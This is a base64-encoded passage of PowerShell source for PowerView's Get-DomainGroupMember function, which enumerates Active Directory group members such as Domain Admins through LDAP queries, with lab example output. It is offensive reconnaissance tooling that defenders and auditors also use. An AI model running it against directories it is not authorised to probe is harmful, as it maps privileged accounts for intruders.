bGVjdC1PYmplY3QgLUV4cGFuZCBuYW1lCnRlc3RsYWIubG9jYWwKCidkZXZcZG9tYWluIGFkbWlucycgfCBHZXQtRG9tYWluR3JvdXBNZW1iZXIgLVZlcmJvc2UKVkVSQk9TRTogW0dldC1Eb21haW5TZWFyY2hlcl0gc2VhcmNoIHN0cmluZzogTERBUDovL1BSSU1BUlkudGVzdGxhYi5sb2NhbC9EQz10ZXN0bGFiLERDPWxvY2FsClZFUkJPU0U6IFtHZXQtRG9tYWluR3JvdXBNZW1iZXJdIEV4dHJhY3RlZCBkb21haW4gJ2Rldi50ZXN0bGFiLmxvY2FsJyBmcm9tICdkZXZcZG9tYWluIGFkbWlucycKVkVSQk9TRTogW0dldC1Eb21haW5TZWFyY2hlcl0gc2VhcmNoIHN0cmluZzogTERBUDovL1BSSU1BUlkudGVzdGxhYi5sb2NhbC9EQz1kZXYsREM9dGVzdGxhYixEQz1sb2NhbApWRVJCT1NFOiBbR2V0LURvbWFpbkdyb3VwTWVtYmVyXSBHZXQtRG9tYWluR3JvdXBNZW1iZXIgZmlsdGVyIHN0cmluZzogKCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApKHwoc2FtQWNjb3VudE5hbWU9ZG9tYWluIGFkbWlucykpKQpWRVJCT1NFOiBbR2V0LURvbWFpblNlYXJjaGVyXSBzZWFyY2ggc3RyaW5nOiBMREFQOi8vUFJJTUFSWS50ZXN0bGFiLmxvY2FsL0RDPWRldixEQz10ZXN0bGFiLERDPWxvY2FsClZFUkJPU0U6IFtHZXQtRG9tYWluT2JqZWN0XSBHZXQtRG9tYWluT2JqZWN0IGZpbHRlciBzdHJpbmc6ICgmKHwoZGlzdGluZ3Vpc2hlZG5hbWU9Q049dXNlcjEsQ049VXNlcnMsREM9ZGV2LERDPXRlc3RsYWIsREM9bG9jYWwpKSkKCkdyb3VwRG9tYWluICAgICAgICAgICAgIDogZGV2LnRlc3RsYWIubG9jYWwKR3JvdXBOYW1lICAgICAgICAgICAgICAgOiBEb21haW4gQWRtaW5zCkdyb3VwRGlzdGluZ3Vpc2hlZE5hbWUgIDogQ049RG9tYWluIEFkbWlucyxDTj1Vc2VycyxEQz1kZXYsREM9dGVzdGxhYixEQz1sb2NhbApNZW1iZXJEb21haW4gICAgICAgICAgICA6IGRldi50ZXN0bGFiLmxvY2FsCk1lbWJlck5hbWUgICAgICAgICAgICAgIDogdXNlcjEKTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUgOiBDTj11c2VyMSxDTj1Vc2VycyxEQz1kZXYsREM9dGVzdGxhYixEQz1sb2NhbApNZW1iZXJPYmplY3RDbGFzcyAgICAgICA6IHVzZXIKTWVtYmVyU0lEICAgICAgICAgICAgICAgOiBTLTEtNS0yMS0zMzkwNDg2NzAtMTIzMzU2ODEwOC00MTQxNTE4NjkwLTIwMTEwOAoKVkVSQk9TRTogW0dldC1Eb21haW5TZWFyY2hlcl0gc2VhcmNoIHN0cmluZzogTERBUDovL1BSSU1BUlkudGVzdGxhYi5sb2NhbC9EQz1kZXYsREM9dGVzdGxhYixEQz1sb2NhbApWRVJCT1NFOiBbR2V0LURvbWFpbk9iamVjdF0gR2V0LURvbWFpbk9iamVjdCBmaWx0ZXIgc3RyaW5nOiAoJih8KGRpc3Rpbmd1aXNoZWRuYW1lPUNOPUFkbWluaXN0cmF0b3IsQ049VXNlcnMsREM9ZGV2LERDPXRlc3RsYWIsREM9bG9jYWwpKSkKR3JvdXBEb21haW4gICAgICAgICAgICAgOiBkZXYudGVzdGxhYi5sb2NhbApHcm91cE5hbWUgICAgICAgICAgICAgICA6IERvbWFpbiBBZG1pbnMKR3JvdXBEaXN0aW5ndWlzaGVkTmFtZSAgOiBDTj1Eb21haW4gQWRtaW5zLENOPVVzZXJzLERDPWRldixEQz10ZXN0bGFiLERDPWxvY2FsCk1lbWJlckRvbWFpbiAgICAgICAgICAgIDogZGV2LnRlc3RsYWIubG9jYWwKTWVtYmVyTmFtZSAgICAgICAgICAgICAgOiBBZG1pbmlzdHJhdG9yCk1lbWJlckRpc3Rpbmd1aXNoZWROYW1lIDogQ049QWRtaW5pc3RyYXRvcixDTj1Vc2VycyxEQz1kZXYsREM9dGVzdGxhYixEQz1sb2NhbApNZW1iZXJPYmplY3RDbGFzcyAgICAgICA6IHVzZXIKTWVtYmVyU0lEICAgICAgICAgICAgICAgOiBTLTEtNS0yMS0zMzkwNDg2NzAtMTIzMzU2ODEwOC00MTQxNTE4NjkwLTUwMAoKLk9VVFBVVFMKClBvd2VyVmlldy5Hcm91cE1lbWJlcgoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCBncm91cCBtZW1iZXIgcHJvcGVydHkgZmllbGRzLgoKLkxJTksKCmh0dHA6Ly93d3cucG93ZXJzaGVsbG1hZ2F6aW5lLmNvbS8yMDEzLzA1LzIzL3BzdGlwLXJldHJpZXZlLWdyb3VwLW1lbWJlcnNoaXAtb2YtYW4tYWN0aXZlLWRpcmVjdG9yeS1ncm91cC1yZWN1cnNpdmVseS8KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlRGVjbGFyZWRWYXJzTW9yZVRoYW5Bc3NpZ25tZW50cycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuR3JvdXBNZW1iZXInKV0KICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ05vbmUnKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnLCAnTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUnLCAnTWVtYmVyTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTWFudWFsUmVjdXJzZScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJlY3Vyc2UsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdSZWN1cnNlVXNpbmdNYXRjaGluZ1J1bGUnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRSZWN1cnNlVXNpbmdNYXRjaGluZ1J1bGUsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWN1cml0eU1hc2tzLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnUHJvcGVydGllcycgPSAnbWVtYmVyLHNhbWFjY291bnRuYW1lLGRpc3Rpbmd1aXNoZWRuYW1lJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJExEQVBGaWx0ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgJEFETmFtZUFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRBRE5hbWVBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJEFETmFtZUFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEFETmFtZUFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgICRHcm91cFNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgIGlmICgkR3JvdXBTZWFyY2hlcikgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZWN1cnNlVXNpbmdNYXRjaGluZ1J1bGUnXSkgewogICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJElkZW50aXR5CiAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ1JhdyddID0gJFRydWUKICAgICAgICAgICAgICAgICRHcm91cCA9IEdldC1Eb21haW5Hcm91cCBAU2VhcmNoZXJBcmd1bWVudHMKCiAgICAgICAgICAgICAgICBpZiAoLW5vdCAkR3JvdXApIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LURvbWFpbkdyb3VwTWVtYmVyXSBFcnJvciBzZWFyY2hpbmcgZm9yIGdyb3VwIHdpdGggaWRlbnRpdHk6ICRJZGVudGl0eSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRHcm91cEZvdW5kTmFtZSA9ICRHcm91cC5wcm9wZXJ0aWVzLml0ZW0oJ3NhbWFjY291bnRuYW1lJylbMF0KICAgICAgICAgICAgICAgICAgICAkR3JvdXBGb3VuZEROID0gJEdyb3VwLnByb3BlcnRpZXMuaXRlbSgnZGlzdGluZ3Vpc2hlZG5hbWUnKVswXQoKICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgewogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBGb3VuZERvbWFpbiA9ICREb21haW4KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgYSBkb21haW4gaXNuJ3QgcGFzc2VkLCB0cnkgdG8gZXh0cmFjdCBpdCBmcm9tIHRoZSBmb3VuZCBncm91cCBkaXN0aW5ndWlzaGVkIG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRHcm91cEZvdW5kRE4pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cEZvdW5kRG9tYWluID0gJEdyb3VwRm91bmRETi5TdWJTdHJpbmcoJEdyb3VwRm91bmRETi5JbmRleE9mKCdEQz0nKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR3JvdXBNZW1iZXJdIFVzaW5nIExEQVAgbWF0Y2hpbmcgcnVsZSB0byByZWN1cnNlIG9uICckR3JvdXBGb3VuZEROJywgb25seSB1c2VyIGFjY291bnRzIHdpbGwgYmUgcmV0dXJuZWQuIgogICAgICAgICAgICAgICAgICAgICRHcm91cFNlYXJjaGVyLmZpbHRlciA9ICIoJihzYW1BY2NvdW50VHlwZT04MDUzMDYzNjgpKG1lbWJlcm9mOjEuMi44NDAuMTEzNTU2LjEuNC4xOTQxOj0kR3JvdXBGb3VuZEROKSkiCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwU2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGRSYW5nZSgoJ2Rpc3Rpbmd1aXNoZWROYW1lJykpCiAgICAgICAgICAgICAgICAgICAgJE1lbWJlcnMgPSAkR3JvdXBTZWFyY2hlci5GaW5kQWxsKCkgfCBGb3JFYWNoLU9iamVjdCB7JF8uUHJvcGVydGllcy5kaXN0aW5ndWlzaGVkbmFtZVswXX0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICROdWxsID0gJFNlYXJjaGVyQXJndW1lbnRzLlJlbW92ZSgnUmF3JykKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICAgICAkRmlsdGVyID0gJycKICAgICAgICAgICAgICAgICRJZGVudGl0eSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8KICAgICAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICcuK1xcLisnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgRE9NQUlOXGdyb3VwbmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZSA9ICRJZGVudGl0eUluc3RhbmNlIHwgQ29udmVydC1BRE5hbWUgLU91dHB1dFR5cGUgQ2Fub25pY2FsCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwRG9tYWluID0gJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UuU3ViU3RyaW5nKDAsICRDb252ZXJ0ZWRJZGVudGl0eUluc3RhbmNlLkluZGV4T2YoJy8nKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cE5hbWUgPSAkSWRlbnRpdHlJbnN0YW5jZS5TcGxpdCgnXCcpWzFdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihzYW1BY2NvdW50TmFtZT0kR3JvdXBOYW1lKSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkR3JvdXBEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR3JvdXBNZW1iZXJdIEV4dHJhY3RlZCBkb21haW4gJyRHcm91cERvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2UnIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJElkZW50aXR5SW5zdGFuY2UuUmVwbGFjZSgnKCcsICdcMjgnKS5SZXBsYWNlKCcpJywgJ1wyOScpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJ15TLTEtLionKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihvYmplY3RzaWQ9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeQ049LionKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihkaXN0aW5ndWlzaGVkbmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHdWlkQnl0ZVN0cmluZyA9ICgtSm9pbiAoKFtHdWlkXSRJZGVudGl0eUluc3RhbmNlKS5Ub0J5dGVBcnJheSgpIHwgRm9yRWFjaC1PYmplY3QgeyRfLlRvU3RyaW5nKCdYJykuUGFkTGVmdCgyLCcwJyl9KSkgLVJlcGxhY2UgJyguLiknLCdcJDEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0Z3VpZD0kR3VpZEJ5dGVTdHJpbmcpIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKHNhbUFjY291bnROYW1lPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkSWRlbnRpdHlGaWx0ZXIgLWFuZCAoJElkZW50aXR5RmlsdGVyLlRyaW0oKSAtbmUgJycpICkgewogICAgICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIih8JElkZW50aXR5RmlsdGVyKSIKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdyb3VwTWVtYmVyXSBVc2luZyBhZGRpdGlvbmFsIExEQVAgZmlsdGVyOiAkTERBUEZpbHRlciIKICAgICAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIkTERBUEZpbHRlciIKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkR3JvdXBTZWFyY2hlci5maWx0ZXIgPSAiKCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApJEZpbHRlcikiCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdyb3VwTWVtYmVyXSBHZXQtRG9tYWluR3JvdXBNZW1iZXIgZmlsdGVyIHN0cmluZzogJCgkR3JvdXBTZWFyY2hlci5maWx0ZXIpIgogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0ID0gJEdyb3VwU2VhcmNoZXIuRmluZE9uZSgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3Igc2VhcmNoaW5nIGZvciBncm91cCB3aXRoIGlkZW50aXR5ICckSWRlbnRpdHknOiAkXyIKICAgICAgICAgICAgICAgICAgICAkTWVtYmVycyA9IEAoKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRHcm91cEZvdW5kTmFtZSA9ICcnCiAgICAgICAgICAgICAgICAkR3JvdXBGb3VuZEROID0gJycKCiAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdCkgewogICAgICAgICAgICAgICAgICAgICRNZW1iZXJzID0gJFJlc3VsdC5wcm9wZXJ0aWVzLml0ZW0oJ21lbWJlcicpCgogICAgICAgICAgICAgICAgICAgIGlmICgkTWVtYmVycy5jb3VudCAtZXEgMCkgewogICAgICAgICAgICAgICAgICAgICAgICAjIHJhbmdlZCBzZWFyY2hpbmcsIHRoYW5rcyBAbWVhdGJhbGxzX18gIQogICAgICAgICAgICAgICAgICAgICAgICAkRmluaXNoZWQgPSAkRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgJEJvdHRvbSA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgJFRvcCA9IDAKCiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlICgtbm90ICRGaW5pc2hlZCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFRvcCA9ICRCb3R0b20gKyAxNDk5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyUmFuZ2U9Im1lbWJlcjtyYW5nZT0kQm90dG9tLSRUb3AiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQm90dG9tICs9IDE1MDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROdWxsID0gJEdyb3VwU2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5DbGVhcigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICRHcm91cFNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkKCIkTWVtYmVyUmFuZ2UiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE51bGwgPSAkR3JvdXBTZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZCgnc2FtYWNjb3VudG5hbWUnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE51bGwgPSAkR3JvdXBTZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZCgnZGlzdGluZ3Vpc2hlZG5hbWUnKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJlc3VsdCA9ICRHcm91cFNlYXJjaGVyLkZpbmRPbmUoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSYW5nZWRQcm9wZXJ0eSA9ICRSZXN1bHQuUHJvcGVydGllcy5Qcm9wZXJ0eU5hbWVzIC1saWtlICJtZW1iZXI7cmFuZ2U9KiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVycyArPSAkUmVzdWx0LlByb3BlcnRpZXMuaXRlbSgkUmFuZ2VkUHJvcGVydHkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwRm91bmROYW1lID0gJFJlc3VsdC5wcm9wZXJ0aWVzLml0ZW0oJ3NhbWFjY291bnRuYW1lJylbMF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBGb3VuZEROID0gJFJlc3VsdC5wcm9wZXJ0aWVzLml0ZW0oJ2Rpc3Rpbmd1aXNoZWRuYW1lJylbMF0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRNZW1iZXJzLmNvdW50IC1lcSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGaW5pc2hlZCA9ICRUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uTWV0aG9kSW52b2NhdGlvbkV4Y2VwdGlvbl0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGaW5pc2hlZCA9ICRUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cEZvdW5kTmFtZSA9ICRSZXN1bHQucHJvcGVydGllcy5pdGVtKCdzYW1hY2NvdW50bmFtZScpWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cEZvdW5kRE4gPSAkUmVzdWx0LnByb3BlcnRpZXMuaXRlbSgnZGlzdGluZ3Vpc2hlZG5hbWUnKVswXQogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVycyArPSAkUmVzdWx0LlByb3BlcnRpZXMuaXRlbSgkUmFuZ2VkUHJvcGVydHkpCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgewogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBGb3VuZERvbWFpbiA9ICREb21haW4KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgYSBkb21haW4gaXNuJ3QgcGFzc2VkLCB0cnkgdG8gZXh0cmFjdCBpdCBmcm9tIHRoZSBmb3VuZCBncm91cCBkaXN0aW5ndWlzaGVkIG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRHcm91cEZvdW5kRE4pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cEZvdW5kRG9tYWluID0gJEdyb3VwRm91bmRETi5TdWJTdHJpbmcoJEdyb3VwRm91bmRETi5JbmRleE9mKCdEQz0nKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBGb3JFYWNoICgkTWVtYmVyIGluICRNZW1iZXJzKSB7CiAgICAgICAgICAgICAgICBpZiAoJFJlY3Vyc2UgLWF